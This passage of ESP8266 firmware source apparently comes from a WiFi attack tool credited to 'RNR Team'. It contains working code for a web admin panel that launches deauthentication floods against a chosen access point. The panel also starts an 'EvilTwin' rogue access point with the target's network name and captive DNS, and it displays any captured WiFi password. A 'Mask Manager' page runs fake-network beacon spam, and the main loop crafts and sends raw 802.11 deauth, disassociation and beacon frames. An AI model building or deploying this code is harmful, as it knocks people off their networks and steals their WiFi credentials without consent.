 <div class="log-box" id="logBox">{logs}</div>
</div>

<div class="footer">ESP8266 &bull; Real-time scanner &bull; Click on a row to select</div>
<div class="watermark"><span>RNR Team</span> &copy; 2026 &bull; All rights reserved</div>
</div></body></html>
)rawliteral";

// ---------- Admin handler ----------
void handleAdmin() {
  addLog("handleAdmin called.");

  int count = 0;
  for (int i = 0; i < 16; i++) if (_networks[i].ssid != "") count++;
  if (count == 0) {
    addLog("No networks cached, running scan...");
    performScan();
    count = 0;
    for (int i = 0; i < 16; i++) if (_networks[i].ssid != "") count++;
    addLog("Scan complete: " + String(count) + " networks.");
  }

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
        addLog("Selected: " + _selectedNetwork.ssid);
      }
    }
  }

  if (webServer.hasArg("deauthint")) {
    int v = webServer.arg("deauthint").toInt();
    if (v < DEAUTH_MIN_MS) v = DEAUTH_MIN_MS;
    if (v > 60000) v = 60000;
    deauth_interval_ms = v;
    addLog("Deauth interval set to " + String(v) + " ms.");
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start" && _selectedNetwork.ssid != "") {
      deauth_intent    = true;
      deauthing_active = true;
      if (!promisc_enabled) { wifi_promiscuous_enable(1); promisc_enabled = true; }
      addLog("Deauth STARTED (admin, intent=ON).");
    } else if (webServer.arg("deauth") == "stop") {
      deauth_intent    = false;
      deauthing_active = false;
      if (promisc_enabled) { wifi_promiscuous_enable(0); promisc_enabled = false; }
      addLog("Deauth STOPPED (admin, intent=OFF).");
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start" && _selectedNetwork.ssid != "") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(n);
      WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192,168,4,1));
      addLog("EvilTwin STARTED as: " + _selectedNetwork.ssid);
      if (webServer.hasArg("deauth") && webServer.arg("deauth") == "start") {
        deauth_intent    = true;
        deauthing_active = true;
        if (!promisc_enabled) { wifi_promiscuous_enable(1); promisc_enabled = true; }
        addLog("Deauth also STARTED.");
      }
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      startFallbackAP();
      addLog("EvilTwin STOPPED. Fallback AP restored.");
    }
    webServer.sendHeader("Location", "/admin", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  String html = String(FPSTR(adminHTML));
  if (html.length() < 100) {
    webServer.send(200, "text/html",
      "<h1>Admin Page</h1><p>Template missing. Please restart the ESP.</p>");
    return;
  }

  html.replace("{network_count}", String(count));
  String selName = (_selectedNetwork.ssid != "") ? _selectedNetwork.ssid : "None";
  html.replace("{selected_name}", selName);

  String rows = "";
  String selectedBSSID = bytesToStr(_selectedNetwork.bssid, 6);
  if (count == 0) {
    rows = "<tr><td colspan='4'>No networks found</td></tr>";
  } else {
    for (int i = 0; i < 16; i++) {
      if (_networks[i].ssid == "") break;
      String bssid = bytesToStr(_networks[i].bssid, 6);
      bool isSelected = (bssid == selectedBSSID);
      String rowClass = isSelected ? "selected" : "";
      rows += "<tr class=\"" + rowClass + "\" data-bssid=\"" + bssid +
              "\" onclick=\"selectNetwork('" + bssid + "')\">";
      rows += "<td class=\"ssid\">" + htmlEscape(_networks[i].ssid) + "</td>";
      rows += "<td>" + bssid + "</td>";
      rows += "<td>" + _networks[i].vendor + "</td>";
      rows += "<td><span class=\"badge\">" + String(_networks[i].ch) + "</span></td>";
      rows += "</tr>";
    }
  }
  html.replace("{network_rows}", rows);

  String captured = (_correct != "") ? htmlEscape(_correct) : "None yet";
  html.replace("{captured_password}", captured);

  bool disabled = (_selectedNetwork.ssid == "");

  // Button reflects INTENT so it's correct even mid-verification
  if (deauth_intent) {
    html.replace("{deauth_button}", "Stop deauthing");
    html.replace("{deauth_action}", "stop");
  } else {
    html.replace("{deauth_button}", "Start deauthing");
    html.replace("{deauth_action}", "start");
  }
  html.replace("{deauth_disabled}", disabled ? "disabled" : "");

  if (hotspot_active) {
    html.replace("{hotspot_button}", "Stop EvilTwin");
    html.replace("{hotspot_action}", "stop");
  } else {
    html.replace("{hotspot_button}", "Start EvilTwin");
    html.replace("{hotspot_action}", "start");
  }
  html.replace("{hotspot_disabled}", disabled ? "disabled" : "");

  html.replace("{deauth_int}", String(deauth_interval_ms));
  html.replace("{deauth_int_label}", deauthIntervalLabel(deauth_interval_ms));

  html.replace("{logs}", getLogsHTML());

  webServer.send(200, "text/html; charset=UTF-8", html);
}

// ---------- Restart / logs handlers ----------
void handleRestart() {
  addLog("Restart requested.");
  webServer.send(200, "text/plain", "Restarting...");
  delay(100);
  ESP.restart();
}

void handleClearLogs() {
  logCount = 0; logHead = 0;
  addLog("Log cleared.");
  webServer.sendHeader("Location", "/admin", true);
  webServer.send(302, "text/plain", "");
}

// ---------- Mask Manager ----------
String _maskHTML = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mask Manager</title>
<style>
:root{--bg:#0a0f18;--panel:#111827;--border:#253044;--text:#f5f7fb;--muted:#8f9bb0;
--accent:#5b8cff;--good:#35d39a}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,sans-serif}
.shell{max-width:900px;margin:auto;padding:28px 18px 40px}
.topbar{display:flex;align-items:center;justify-content:space-between;gap:18px;
padding:18px 20px;margin-bottom:22px;background:rgba(17,24,39,.82);
border:1px solid var(--border);border-radius:18px}
.brand{display:flex;align-items:center;gap:13px}
.logo{width:44px;height:44px;border-radius:13px;display:grid;place-items:center;
background:linear-gradient(135deg,var(--accent),#7c5cff);font-weight:800;font-size:18px}
.title{font-size:18px;font-weight:750}
.subtitle{font-size:12px;color:var(--muted)}
.actions{display:flex;gap:9px;flex-wrap:wrap;margin:12px 0}
button{border:1px solid var(--border);background:#151e2d;color:var(--text);
padding:9px 13px;border-radius:10px;cursor:pointer;font-weight:650}
button:hover{border-color:#3b4a65;background:#192438}
.primary{background:var(--accent);border-color:var(--accent)}
.primary:hover{background:#4e7ff0}
.danger{background:#e74c3c;border-color:#e74c3c}
.danger:hover{background:#c0392b}
.success{background:#27ae60;border-color:#27ae60}
.success:hover{background:#2ecc71}
.table-wrap{overflow-x:auto;border:1px solid var(--border);border-radius:17px;
background:rgba(17,24,39,.82)}
table{width:100%;border-collapse:collapse;min-width:500px}
th,td{text-align:left;padding:15px 16px;border-bottom:1px solid var(--border)}
th{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);font-weight:700}
td{font-size:13px}tr:last-child td{border-bottom:0}
.trash{background:transparent;border:none;color:#e74c3c;cursor:pointer;font-size:18px;padding:4px 8px}
.trash:hover{color:#ff6b6b}
.empty{text-align:center;color:var(--muted);padding:30px 0}
.back-link{display:inline-block;margin-bottom:12px;color:var(--accent);text-decoration:none}
.back-link:hover{text-decoration:underline}
.input-row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:8px 0}
.input-row input{background:#0f1724;border:1px solid var(--border);color:var(--text);
padding:8px 12px;border-radius:8px;flex:1;min-width:120px}
.input-row input:focus{outline:1px solid var(--accent)}
.footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
.watermark{text-align:center;margin-top:22px;font-size:13px;color:var(--muted);
opacity:0.8;letter-spacing:0.5px}
.watermark span{color:var(--accent);font-weight:700}
@media(max-width:700px){
 .actions{flex-direction:column}
 .input-row{flex-direction:column}
 .input-row input{width:100%}
}
</style></head>
<body><div class="shell">
<a href="/admin" class="back-link">&larr; Back to Admin</a>
<div class="topbar">
 <div class="brand"><div class="logo">M</div>
  <div><div class="title">Mask Manager</div>
       <div class="subtitle">Create fake WiFi networks</div></div></div>
 <div><span style="color:var(--muted);font-size:13px">Total: {count}</span></div>
</div>

<div class="actions">
 <div class="input-row">
  <input type="text" id="customSsid" placeholder="SSID" style="flex:2">
  <button onclick="addCustom()" class="primary">Add Custom</button>
 </div>
 <div class="input-row">
  <input type="number" id="randomCount" value="5" min="1" max="10" style="width:80px">
  <button onclick="addRandom()" class="primary">Generate Random</button>
  <button onclick="clearAll()" class="danger">Delete All</button>
 </div>
 <div class="input-row">
  <button onclick="startSpam()" class="success" id="startBtn">&#9654; Start Spamming</button>
  <button onclick="stopSpam()" class="danger" id="stopBtn">&#9209; Stop Spamming</button>
 </div>
 <div class="spam-status" id="spamStatus">Status: {spam_status}</div>
</div>

<div class="table-wrap"><table>
 <thead><tr><th>#</th><th>SSID</th><th>Action</th></tr></thead>
 <tbody id="maskTable">{rows}</tbody>
</table></div>
<div class="footer">All masks are stored in memory only</div>
<div class="watermark"><span>RNR Team</span> &copy; 2026 &bull; All rights reserved</div>
</div>
<script>
function addCustom(){const s=document.getElementById('customSsid').value.trim();
 if(!s){alert('Please enter an SSID');return;}
 fetch('/masks/add?ssid='+encodeURIComponent(s),{method:'POST'}).then(()=>location.reload());}
function addRandom(){const c=document.getElementById('randomCount').value||5;
 fetch('/masks/random?count='+c,{method:'POST'}).then(()=>location.reload());}
function deleteMask(i){if(confirm('Delete this mask?')){
 fetch('/masks/delete?index='+i,{method:'POST'}).then(()=>location.reload());}}
function clearAll(){if(confirm('Delete ALL masks?')){
 fetch('/masks/clear',{method:'POST'}).then(()=>location.reload());}}
function startSpam(){fetch('/masks/start',{method:'POST'}).then(()=>location.reload());}
function stopSpam(){fetch('/masks/stop',{method:'POST'}).then(()=>location.reload());}
</script></body></html>
)rawliteral";

void handleMasks() {
  String html = String(_maskHTML);
  String rows = "";
  if (maskCount == 0) {
    rows = "<tr><td colspan='3' class='empty'>No masks created yet</td></tr>";
  } else {
    for (int i = 0; i < maskCount; i++) {
      rows += "<tr><td>" + String(i + 1) + "</td>";
      rows += "<td>" + htmlEscape(masks[i].ssid) + "</td>";
      rows += "<td><button class='trash' onclick='deleteMask(" + String(i) + ")'>&#128465;</button></td></tr>";
    }
  }
  html.replace("{rows}", rows);
  html.replace("{count}", String(maskCount));
  html.replace("{spam_status}", beacon_spamming_active ? "&#128994; Spamming" : "&#128308; Stopped");
  webServer.send(200, "text/html; charset=UTF-8", html);
}

void handleMasksAdd() {
  if (webServer.hasArg("ssid")) {
    String ssid = webServer.arg("ssid");
    if (ssid.length() > 0) { addMask(ssid); addLog("Mask added: " + ssid); }
  }
  webServer.sendHeader("Location", "/masks", true);
  webServer.send(302, "text/plain", "");
}

void handleMasksRandom() {
  int count = 5;
  if (webServer.hasArg("count")) {
    count = webServer.arg("count").toInt();
    if (count < 1) count = 1;
    if (count > 10) count = 10;
  }
  for (int i = 0; i < count; i++) {
    if (maskCount >= MAX_MASKS) break;
    addMask(randomSSID());
  }
  addLog("Added " + String(count) + " random mask(s).");
  webServer.sendHeader("Location", "/masks", true);
  webServer.send(302, "text/plain", "");
}

void handleMasksDelete() {
  if (webServer.hasArg("index")) {
    int idx = webServer.arg("index").toInt();
    deleteMask(idx);
    addLog("Mask deleted (idx=" + String(idx) + ").");
  }
  webServer.sendHeader("Location", "/masks", true);
  webServer.send(302, "text/plain", "");
}

void handleMasksClear() {
  clearMasks();
  addLog("All masks cleared.");
  webServer.sendHeader("Location", "/masks", true);
  webServer.send(302, "text/plain", "");
}

void handleMasksStart() {
  if (maskCount > 0) { beacon_spamming_active = true; addLog("Beacon spamming STARTED."); }
  webServer.sendHeader("Location", "/masks", true);
  webServer.send(302, "text/plain", "");
}

void handleMasksStop() {
  beacon_spamming_active = false;
  addLog("Beacon spamming STOPPED.");
  webServer.sendHeader("Location", "/masks", true);
  webServer.send(302, "text/plain", "");
}

// ---------- Utility ----------
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

// ---------- Loop ----------
unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Deferred AP swap after success
  if (pending_ap_swap && (long)(millis() - pending_ap_swap_time) >= 0) {
    pending_ap_swap = false;
    Serial.println("Performing deferred AP swap...");
    startFallbackAP();
    if (promisc_enabled) { wifi_promiscuous_enable(0); promisc_enabled = false; }
    addLog("Deauth disabled (success).");
  }

  // ----- Deauth (uses configurable interval) -----
  if (deauthing_active && _selectedNetwork.ssid != "" &&
      _selectedNetwork.ch >= 1 && _selectedNetwork.ch <= 14 &&
      millis() - deauth_now >= (unsigned long)deauth_interval_ms) {

    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {
      0xC0,0x00,0x00,0x00,
      0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
      0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
      0xFF,0xFF,0xFF,0xFF,0xFF,
      0x00,0x00,0x01,0x00
    };
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;
    deauthPacket[0] = 0xC0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauthPacket[0] = 0xA0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauth_now = millis();
  }

  // ----- Beacon Spamming -----
  if (beacon_spamming_active && maskCount > 0) {
    uint32_t currentTime = millis();
    if (currentTime - attackTime > 100) {
      attackTime = currentTime;
      nextChannel();
      for (int m = 0; m < maskCount; m++) {
        uint8_t* mac = masks[m].bssid;
        memcpy(&beaconPacket[10], mac, 6);
        memcpy(&beaconPacket[16], mac, 6);
        memcpy(&beaconPacket[38], emptySSID, 32);
        int ssidLen = masks[m].ssid.length();
        if (ssidLen > 32) ssidLen = 32;
        for (int i = 0; i < ssidLen; i++) beaconPacket[38 + i] = masks[m].ssid.charAt(i);
        beaconPacket[82] = wifi_channel;
        for (int k = 0; k < 3; k++) {
          if (appendSpaces) {
            wifi_send_pkt_freedom(beaconPacket, packetSize, 0);
          } else {
            uint16_t tmpPacketSize = (packetSize - 32) + ssidLen;
            uint8_t* tmpPacket = new uint8_t[tmpPacketSize];
            memcpy(&tmpPacket[0], &beaconPacket[0], 38 + ssidLen);
            tmpPacket[37] = ssidLen;
            memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13);
            wifi_send_pkt_freedom(tmpPacket, tmpPacketSize, 0);
            delete tmpPacket;
          }
          delay(1);
        }
      }
    }
    if (currentTime - packetRateTime > 1000) {
      packetRateTime = currentTime;
      Serial.print("Beacon packets/s: "); Serial.println(packetCounter);
      packetCounter = 0;
    }
  }

  // Scan every 15s
  if (millis() - now >= 15000) { performScan(); now = millis(); }
  if (millis() - wifinow >= 2000) { wifinow = millis(); }
}
